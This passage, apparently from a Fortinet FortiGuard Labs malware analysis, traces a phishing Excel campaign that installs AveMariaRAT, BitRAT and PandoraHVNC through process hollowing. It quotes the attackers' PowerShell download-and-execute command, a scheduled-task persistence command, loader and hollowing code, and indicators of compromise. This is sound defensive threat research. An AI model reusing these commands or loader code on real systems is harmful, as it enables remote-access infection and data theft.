                    "html": "<ul>\n<li>powershell $MMMMMMM=((neW-ObjEcT ((\"Net.Webclient\"))).((\"Downloadstring\")).invoke(((\"hxxps[:]//taxfile[.]mediafire.com/file/175lr9wsa5n97x8/mainpw.dll/file\"))));Invoke-Expression $MMMMMMM</li>\n<li>schtasks /create /sc MINUTE /mo 82 /tn calendersw /F /tr \"\"\"%programdata%\\ddond.com \"\"\"\"\"\" hxxps[:]//www[.]mediafire.com/file/c3zcoq7ay6nql9i/back.htm/file\"\"\"</li>\n<li>taskkill /f /im WinWord.exe</li>\n<li>taskkill /f /im Excel.exe</li>\n<li>taskkill /f /im POWERPNT.exe</li>\n</ul>"
                },
                {
                    "id": "<sentence_0x408ca375>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "It runs the PowerShell application to download a PowerShell file called mainpw.dll and then execute it.",
                    "html": "<p>It runs the PowerShell application to download a PowerShell file called \u201cmainpw.dll\u201d and then execute it.</p>"
                },
                {
                    "id": "<sentence_0xf98eafb6>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "It then runs schtasks to create a schedule task named calendersw in the system Task Scheduler. It performs the command C:\\ProgramData\\ddond.com hxxps[:]//www[.]mediafire.com/file/c3zcoq7ay6nql9i/back.htm/file every 82 minutes, which looks like parsing APRL27.html. It is also a persistence mechanism. Once it starts, back.htm adds more scheduled tasks.",
                    "html": "<p>It then runs schtasks to create a schedule task named \u201ccalendersw\u201d in the system \u201cTask Scheduler\u201c. It performs the command \u201cC:\\ProgramData\\ddond.com hxxps[:]//www[.]mediafire.com/file/c3zcoq7ay6nql9i/back.htm/file\u201d every 82 minutes, which looks like parsing \u201cAPRL27.html\u201d. It is also a persistence mechanism. Once it starts, back.htm adds more scheduled tasks.</p>"
                },
                {
                    "id": "<sentence_0xdb61a36c>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "It also runs taskkill to kill processes, if existing, of MS Word (WinWord.exe), MS Excel (Excel.exe), and MS Pointpoint (POWERPNT.exe).",
                    "html": "<p>It also runs taskkill to kill processes, if existing, of MS Word (WinWord.exe), MS Excel (Excel.exe), and MS Pointpoint (POWERPNT.exe).</p>"
                },
                {
                    "id": "<sentence_0x335c3a47>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0x60fd8108>": "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"
                    },
                    "text": "",
                    "html": "<img alt=\"APRL27.htm traffic\" class=\"loading\" src=\"data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7\"/>"
                },
                {
                    "id": "<sentence_0xd1611538>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Figure 3.2 APRL27.htm traffic",
                    "html": "\nFigure 3.2 \u2013 APRL27.htm traffic\n"
                },
                {
                    "id": "<sentence_0x55954315>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Figure 3.2 is the screenshot of an HTTP proxy program showing the packets from APRL27.htm to mainpw.dll marked in the red box. The green box (back.htm) and blue box (Start.htm) are other groups of requests from other ddond.com commands started by the Task Scheduler.",
                    "html": "<p>Figure 3.2 is the screenshot of an HTTP proxy program showing the packets from \u201cAPRL27.htm\u201d to \u201cmainpw.dll\u201d marked in the red box. The green box (back.htm) and blue box (Start.htm) are other groups of requests from other \u201cddond.com\u201d commands started by the Task Scheduler.</p>"
                },
                {
                    "id": "<sentence_0xaba00fdb>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The mainpw.dll file (size 7.58MB) is full of PowerShell code that can be split into three parts for three fileless malware. Figure 3.3 is a display of the simplified structure of mainpw.dll.",
                    "html": "<p>The \u201cmainpw.dll\u201d file (size 7.58MB) is full of PowerShell code that can be split into three parts for three fileless malware. Figure 3.3 is a display of the simplified structure of \u201cmainpw.dll\u201d.</p>"
                },
                {
                    "id": "<sentence_0xf9297a7>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0x60fd8108>": "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"
                    },
                    "text": "",
                    "html": "<img alt=\"Outlines of the PowerShell code inside \u201cmainpw.dll\u201d\" class=\"loading\" src=\"data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7\"/>"
                },
                {
                    "id": "<sentence_0x46bcc76f>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Figure 3.3 Outlines of the PowerShell code inside mainpw.dll",
                    "html": "\n Figure 3.3 \u2013 Outlines of the PowerShell code inside \u201cmainpw.dll\u201d\n"
                },
                {
                    "id": "<sentence_0x641c078f>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x494cb109>": "https://www.fortinet.com/resources/cyberglossary/malware?utm_source=blog&utm_campaign=malware"
                    },
                    "text": "This code has three code segments and uses the same code logic for each malware. Ill explain how this works for each malware through their variables.",
                    "html": "<p>This code has three code segments and uses the same code logic for each malware. I\u2019ll explain how this works for each <a href=\"https://www.fortinet.com/resources/cyberglossary/malware?utm_source=blog&amp;utm_campaign=malware\">malware</a> through their variables.</p>"
                },
                {
                    "id": "<sentence_0xab773ef6>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The first $hexString contains a dynamic method for performing GZip decompression.<crlf>The second $hexString contains dynamic PowerShell code that decompresses the malware payload and an inner .Net module file that deploys the malware payload.<crlf>The $nona is a huge byte array that contains the GZip-compressed malware payload. The following PowerShell codes extracted from the second $hexString are used to decompress the malware payload in $nona and the inner .Net module for deploying the malware payload into two local variables.",
                    "html": "<ul>\n<li>The first \u201c$hexString\u201d contains a dynamic method for performing GZip decompression.</li>\n<li>The second \u201c$hexString\u201d contains dynamic PowerShell code that decompresses the malware payload and an inner .Net module file that deploys the malware payload. </li>\n<li>The \u201c$nona\u201d is a huge byte array that contains the GZip-compressed malware payload. The following PowerShell codes extracted from the second $hexString are used to decompress the malware payload in $nona and the inner .Net module for deploying the malware payload into two local variables.</li>\n</ul>"
                },
                {
                    "id": "<sentence_0xded75686>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "[byte[]] $RSETDYUGUIDRSTRDYUGIHOYRTSETRTYDUGIOH = Get-<crlf>DecompressedByteArray $nona",
                    "html": "<p>[byte[]] $RSETDYUGUIDRSTRDYUGIHOYRTSETRTYDUGIOH = Get-\nDecompressedByteArray $nona</p>"
                },
                {
                    "id": "<sentence_0x9a10ee68>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "[byte[]] $RDSFGTFHYGUJHKGYFTDRSRDTFYGJUHKDDRTFYG =Get-<crlf>DecompressedByteArray $STRDYFUGIHUYTYRTESRDYUGIRI",
                    "html": "<p>[byte[]] $RDSFGTFHYGUJHKGYFTDRSRDTFYGJUHKDDRTFYG =Get- \nDecompressedByteArray $STRDYFUGIHUYTYRTESRDYUGIRI</p>"
                },
                {
                    "id": "<sentence_0x757613e7>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "At the end of each malware code segment, the code calls the Load() method to load the inner .Net module from $RDSFGTFHYGUJHKGYFTDRSRDTFYGJUHKDDRTFYG. It then calls the Invoke() method to invoke the projFUD.PA.Execute() function of the inner .Net module with two parameters, which are an exe files full path and a fileless malware payload. Here is a piece of the PowerShell code used for the first malware.",
                    "html": "<p>At the end of each malware code segment, the code calls the \u201cLoad()\u201d method to load the inner .Net module from \u201c$RDSFGTFHYGUJHKGYFTDRSRDTFYGJUHKDDRTFYG\u201d. It then calls the Invoke() method to invoke the \u201cprojFUD.PA.Execute()\u201d function of the inner .Net module with two parameters, which are an exe file\u2019s full path and a fileless malware payload. Here is a piece of the PowerShell code used for the first malware.</p>"
                },
                {
                    "id": "<sentence_0xa844ff4f>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "[Reflection.Assembly]::Load($RDSFGTFHYGUJHKGYFTDRSRDTFYGJUHKDDRTFYG).GetType('projFUD.PA').GetMethod('Execute').Invoke($null,[object[]] ( 'C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\aspnet_compiler.exe',$RSETDYUGUIDRSTRDYUGIHOYRTSETRTYDUGIOH))",
                    "html": "<p>[Reflection.Assembly]::Load($RDSFGTFHYGUJHKGYFTDRSRDTFYGJUHKDDRTFYG).GetType('projFUD.PA').GetMethod('Execute').Invoke($null,[object[]] ( 'C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\aspnet_compiler.exe',$RSETDYUGUIDRSTRDYUGIHOYRTSETRTYDUGIOH))</p>"
                }
            ]
        },
        {
            "id": "<chapter_0x1e511bff>",
            "title": "Dynamic .Net Module for Process Hollowing",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0x2208ae06>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "It is the inner .Net module that is dynamically extracted from the second $hexString variable. Its function projFUD.PA.Execute() is called from PowerShell, where projFUD is the name space, PA is the class name, and Execute() is a member function of class PA. Figure 4.1 shows a debugger breaking at the entry of this function.",
                    "html": "<p>It is the inner .Net module that is dynamically extracted from the second $hexString variable. Its function \u201cprojFUD.PA.Execute()\u201d is called from PowerShell, where \u201cprojFUD\u201d is the name space, \u201cPA\u201d is the class name, and \u201cExecute()\u201d is a member function of class \u201cPA\u201d. Figure 4.1 shows a debugger breaking at the entry of this function. </p>"
                },
                {
                    "id": "<sentence_0x726a6910>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0x60fd8108>": "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"
                    },
                    "text": "",
                    "html": "<img alt=\"Break at the entry of function \u201cprojFUD.PA.Execute()\u201d\" class=\"loading\" src=\"data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7\"/>"
                },
                {
                    "id": "<sentence_0xadf9f316>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Figure 4.1 Break at the entry of function projFUD.PA.Execute()",
                    "html": "\n Figure 4.1 \u2013 Break at the entry of function \u201cprojFUD.PA.Execute()\u201d\n"
                },
                {
                    "id": "<sentence_0x11bc5c6a>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "From the bottom, in the Locals variable sub-tab, we see the two passed parameters. It then performs process hollowing to inject the malware payload into a newly-created process of aspnet_compiler.exe.",
                    "html": "<p>From the bottom, in the \u201cLocals\u201d variable sub-tab, we see the two passed parameters. It then performs process hollowing to inject the malware payload into a newly-created process of \u201caspnet_compiler.exe\u201d.</p>"
                },
                {
                    "id": "<sentence_0x7a8b36f9>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0x60fd8108>": "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"
                    },
                    "text": "",
                    "html": "<img alt=\"Creating a suspended process\" class=\"loading\" src=\"data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7\"/>"
                },
                {
                    "id": "<sentence_0xbe161e37>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Figure 4.2 Creating a suspended process",
                    "html": "\n Figure 4.2 \u2013 Creating a suspended process\n"
                },
                {
                    "id": "<sentence_0xd893a260>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The Execute() function then calls the Windows API CreateProcessA() to create a process of aspnet_compiler.exe with a Create Flag of 0x8000004. This is a combination of CREATE_NO_WINDOW and CREATE_SUSPENDED, as shown in Figure 4.2.",
                    "html": "<p>The \u201cExecute()\u201d function then calls the Windows API \u201cCreateProcessA()\u201d to create a process of \u201caspnet_compiler.exe\u201d with a Create Flag of 0x8000004. This is a combination of CREATE_NO_WINDOW and CREATE_SUSPENDED, as shown in Figure 4.2.</p>"
                },
                {
                    "id": "<sentence_0x696d8ae2>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Next, it allocates memory inside this process and deploys the malware payload data into it. It modifies the value at memory address 0x7EFDE008, where it saves the process base address of PEB (Process Environment Block) and modifies the process registry to have its EIP (Extended Instruction Pointer) pointing to the copied malware payload. To finish, it needs to call the API WriteProcessMemory() numerous times as well as the API Wow64SetThreadContext().",
                    "html": "<p>Next, it allocates memory inside this process and deploys the malware payload data into it. It modifies the value at memory address 0x7EFDE008, where it saves the process\u2019 base address of PEB (Process Environment Block) and modifies the process\u2019 registry to have its EIP (Extended Instruction Pointer) pointing to the copied malware payload. To finish, it needs to call the API WriteProcessMemory() numerous times as well as the API Wow64SetThreadContext().</p>"
                },
                {
                    "id": "<sentence_0xc61f6924>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "After all the above steps have been completed, it finally calls the API ResumeThread() to have the process run the malware payload. Below is the code used for calling this API. processInformation.ThreadHandle is the thread handle of the newly created process.",
                    "html": "<p>After all the above steps have been completed, it finally calls the API ResumeThread() to have the process run the malware payload. Below is the code used for calling this API. \u201cprocessInformation.ThreadHandle\u201d is the thread handle of the newly created process.</p>"
                },
                {
                    "id": "<sentence_0xd3417e20>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "num15 = (int)PA.LX99ujNZ7X3YScj6T4(PA.ResumeThread, PA.vgxYHnXuOV51G6NIu3(\"010010010110111001110110011011110110101101100101\"), CallType.Method,<crlf>new object[]<crlf>{<crlf>processInformation.ThreadHandle<crlf>});",
                    "html": "<p>num15 = (int)PA.LX99ujNZ7X3YScj6T4(PA.ResumeThread, PA.vgxYHnXuOV51G6NIu3(\"010010010110111001110110011011110110101101100101\"), CallType.Method, \nnew object[]\n {\n processInformation.ThreadHandle\n });</p>"
                }
            ]
        },
        {
            "id": "<chapter_0x8f6c2ed4>",
            "title": "Conclusion",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0xde75408c>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "In this analysis, I explained how an Excel document attachment to a disguised phishing email is sent to a victims device and how the malicious code inside the Excel document is automatically executed once opened by the recipient.",
                    "html": "<p>In this analysis, I explained how an Excel document attachment to a disguised phishing email is sent to a victim\u2019s device and how the malicious code inside the Excel document is automatically executed once opened by the recipient.</p>"
                },
                {
                    "id": "<sentence_0xbbd75bb3>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "I also showed how the VBA code leads to the access of a remote html file (APRL27.htm) using the copied mshta.exe command. This file contains malicious JavaScript code to be executed later. I also demonstrated how it performs persistence by adding tasks into the system Task Scheduler to remain in the victims device.",
                    "html": "<p>I also showed how the VBA code leads to the access of a remote html file (APRL27.htm) using the copied \u201cmshta.exe\u201d command. This file contains malicious JavaScript code to be executed later. I also demonstrated how it performs persistence by adding tasks into the system \u201cTask Scheduler\u201d to remain in the victim\u2019s device.</p>"
                },
                {
                    "id": "<sentence_0xab86ae34>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "I also explained how it obtains three fileless malware in a huge downloaded PowerShell file to bypass detection, and how these are later deployed and executed inside the target processes through Process Hollowing. These three fileless malware are AveMariaRAT / BitRAT / PandoraHVNC.",
                    "html": "<p>I also explained how it obtains three fileless malware in a huge downloaded PowerShell file to bypass detection, and how these are later deployed and executed inside the target processes through Process Hollowing. These three fileless malware are AveMariaRAT / BitRAT / PandoraHVNC.</p>"
                },
                {
                    "id": "<sentence_0xc0d9835e>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "In Part 2 of this analysis, I will focus on these three fileless malware to see what they do on the victims device, as well as what kind of data they are able to steal.",
                    "html": "<p>In Part 2 of this analysis, I will focus on these three fileless malware to see what they do on the victim\u2019s device, as well as what kind of data they are able to steal.</p>"
                }
            ]
        },
        {
            "id": "<chapter_0x2f804115>",
            "title": "Fortinet Protections",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0x4aa7ca5f>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xa98186d8>": "https://www.fortinet.com/support-and-training/support-services/fortiguard-security-subscriptions/web-filtering.html?utm_source=blog&utm_campaign=web-filtering",
                        "<a_0xbffc1f08>": "https://www.fortinet.com/products/email-security/fortimail.html?utm_source=blog&utm_campaign=fortimail-main-page",
                        "<a_0x98c0cf3>": "https://www.fortinet.com/products/endpoint-security/forticlient.html?utm_source=blog&utm_campaign=endpoint-web-page",
                        "<a_0xa5bb17c1>": "https://www.fortinet.com/products/endpoint-security/fortiedr.html?utm_source=blog&utm_campaign=fortiedr"
                    },
                    "text": "Fortinet customers are already protected from this malware by FortiGuards Web Filtering, AntiVirus, FortiMail, FortiClient, FortiEDR services, and CDR (content disarm and reconstruction) services, as follows:",
                    "html": "<p>Fortinet customers are already protected from this malware by FortiGuard\u2019s <a href=\"https://www.fortinet.com/support-and-training/support-services/fortiguard-security-subscriptions/web-filtering.html?utm_source=blog&amp;utm_campaign=web-filtering\">Web Filtering</a>, AntiVirus, <a href=\"https://www.fortinet.com/products/email-security/fortimail.html?utm_source=blog&amp;utm_campaign=fortimail-main-page\">FortiMail</a>, <a href=\"https://www.fortinet.com/products/endpoint-security/forticlient.html?utm_source=blog&amp;utm_campaign=endpoint-web-page\">FortiClient</a>, <a href=\"https://www.fortinet.com/products/endpoint-security/fortiedr.html?utm_source=blog&amp;utm_campaign=fortiedr\">FortiEDR</a> services, and CDR (content disarm and reconstruction) services, as follows:</p>"
                },
                {
                    "id": "<sentence_0x4e6d681b>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "All relevant URLs have been rated as \"Malicious Websites\" by the FortiGuard Web Filtering service.",
                    "html": "<p>All relevant URLs have been rated as \"Malicious Websites\" by the FortiGuard Web Filtering service.</p>"
                },
                {
                    "id": "<sentence_0x27997cf>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The phishing email with its attached malicious Excel document can be disarmed by the FortiGuard CDR (content disarm and reconstruction) service.",
                    "html": "<p>The phishing email with its attached malicious Excel document can be disarmed by the FortiGuard CDR (content disarm and reconstruction) service.</p>"
                },
                {
                    "id": "<sentence_0xfbfab6f4>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The captured Excel sample, the downloaded html file, and the PowerShell file with three fileless malware payload files are detected as \"VBA/Agent.DDON!tr\", \"JS/Agent.DDON!tr.dldr\", and \"PowerShell/Agent.e535!tr\" and are blocked by the FortiGuard Antivirus service.",
                    "html": "<p>The captured Excel sample, the downloaded html file, and the PowerShell file with three fileless malware payload files are detected as \"VBA/Agent.DDON!tr\", \"JS/Agent.DDON!tr.dldr\", and \"PowerShell/Agent.e535!tr\" and are blocked by the FortiGuard Antivirus service.</p>"
                },
                {
                    "id": "<sentence_0x941d094b>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xa5bb17c1>": "https://www.fortinet.com/products/endpoint-security/fortiedr.html?utm_source=blog&utm_campaign=fortiedr"
                    },
                    "text": "FortiEDR detects both the Excel file and the huge PowerShell file as malicious based on their behavior.",
                    "html": "<p><a href=\"https://www.fortinet.com/products/endpoint-security/fortiedr.html?utm_source=blog&amp;utm_campaign=fortiedr\">FortiEDR</a> detects both the Excel file and the huge PowerShell file as malicious based on their behavior.</p>"
                },
                {
                    "id": "<sentence_0x33845f7>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x48b2dabc>": "https://training.fortinet.com/?utm_source=blog&utm_campaign=nse-institute",
                        "<a_0x5ee911c7>": "https://training.fortinet.com/local/staticpage/view.php?page=nse_1&utm_source=blog&utm_campaign=nse-1"
                    },
                    "text": "In addition to these protections, we suggest that organizations have their end users also go through the FREE NSE training: NSE 1 Information Security Awareness. It includes a module on Internet threats that is designed to help end users learn how to identify and protect themselves from phishing attacks.",
                    "html": "<p>In addition to these protections, we suggest that organizations have their end users also go through the FREE <a href=\"https://training.fortinet.com/?utm_source=blog&amp;utm_campaign=nse-institute\">NSE training</a>: <a href=\"https://training.fortinet.com/local/staticpage/view.php?page=nse_1&amp;utm_source=blog&amp;utm_campaign=nse-1\">NSE 1 \u2013 Information Security Awareness</a>. It includes a module on Internet threats that is designed to help end users learn how to identify and protect themselves from phishing attacks.</p>"
                }
            ]
        },
        {
            "id": "<chapter_0x53c2b2e7>",
            "title": "IOCs",
            "title_level": 2,
            "sentences": []
        },
        {
            "id": "<chapter_0x36d95833>",
            "title": "URLs:",
            "title_level": 4,
            "sentences": [
                {
                    "id": "<sentence_0xf8486767>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "hxxps://taxfile[.]mediafire[.]com/file/6hxdxdkgeyq0z1o/APRL27[.]htm/file",
                    "html": "<p>hxxps://taxfile[.]mediafire[.]com/file/6hxdxdkgeyq0z1o/APRL27[.]htm/file</p>"
                },
                {
                    "id": "<sentence_0xe3d9db50>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "hxxps://www[.]mediafire[.]com/file/c3zcoq7ay6nql9i/back[.]htm/file",
                    "html": "<p>hxxps://www[.]mediafire[.]com/file/c3zcoq7ay6nql9i/back[.]htm/file</p>"
                },
                {
                    "id": "<sentence_0xb07bec32>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "hxxps://www[.]mediafire[.]com/file/jjyy2npmnhx6o49/Start[.]htm/file",
                    "html": "<p>hxxps://www[.]mediafire[.]com/file/jjyy2npmnhx6o49/Start[.]htm/file</p>"
                },
                {
                    "id": "<sentence_0x6f665933>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "hxxps://taxmogalupupitpamobitola[.]blogspot[.]com/atom[.]xml",
                    "html": "<p>hxxps://taxmogalupupitpamobitola[.]blogspot[.]com/atom[.]xml</p>"
                }
            ]
        },
        {
            "id": "<chapter_0xb214e498>",
            "title": "Sample SHA-256 Involved in the Campaign:",
            "title_level": 4,
            "sentences": [
                {
                    "id": "<sentence_0xd376c562>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "[Remittance-Details-951244-1.xlam]",
                    "html": "<p>[Remittance-Details-951244-1.xlam]</p>"
                },
                {
                    "id": "<sentence_0xdc01f9de>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "8007BB9CAA6A1456FFC829270BE2E62D1905D5B71E9DC9F9673DEC9AFBF13BFC",
                    "html": "<p>8007BB9CAA6A1456FFC829270BE2E62D1905D5B71E9DC9F9673DEC9AFBF13BFC</p>"
                },
                {
                    "id": "<sentence_0xce345d8>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "[APRL27.htm]",
                    "html": "<p>[APRL27.htm]</p>"
                },
                {
                    "id": "<sentence_0xd4f0663f>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "D71ADD25520799720ADD43A5F4925B796BEA11BF55644990B4B9A70B7EAEACBA",
                    "html": "<p>D71ADD25520799720ADD43A5F4925B796BEA11BF55644990B4B9A70B7EAEACBA</p>"
                },
                {
                    "id": "<sentence_0xb8684aa9>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "[mainpw.dll]",
                    "html": "<p>[mainpw.dll]</p>"
                },
                {
                    "id": "<sentence_0x28b31816>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "3D71A243E5D9BA44E3D71D4DA15D928658F92B2F0A220B7DEFE0136108871449",
                    "html": "<p>3D71A243E5D9BA44E3D71D4DA15D928658F92B2F0A220B7DEFE0136108871449</p>"
                },
                {
                    "id": "<sentence_0x9c7259c3>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x5df3463d>": "https://www.fortinet.com/fortiguard/labs?utm_source=blog&utm_campaign=fortiguard-labs",
                        "<a_0x3a75e562>": "https://www.fortinet.com/fortiguard/labs?tab=security-bundles&utm_source=blog&utm_campaign=security-bundles"
                    },
                    "text": "Learn more about Fortinets FortiGuard Labs threat research and intelligence organization and the FortiGuard Security Subscriptions and Services portfolio.",
                    "html": "<p>Learn more about Fortinet\u2019s <a href=\"https://www.fortinet.com/fortiguard/labs?utm_source=blog&amp;utm_campaign=fortiguard-labs\">FortiGuard Labs</a> threat research and intelligence organization and the FortiGuard Security Subscriptions and Services <a href=\"https://www.fortinet.com/fortiguard/labs?tab=security-bundles&amp;utm_source=blog&amp;utm_campaign=security-bundles\">portfolio</a>.</p>"
                }
            ]
        }
    ]
}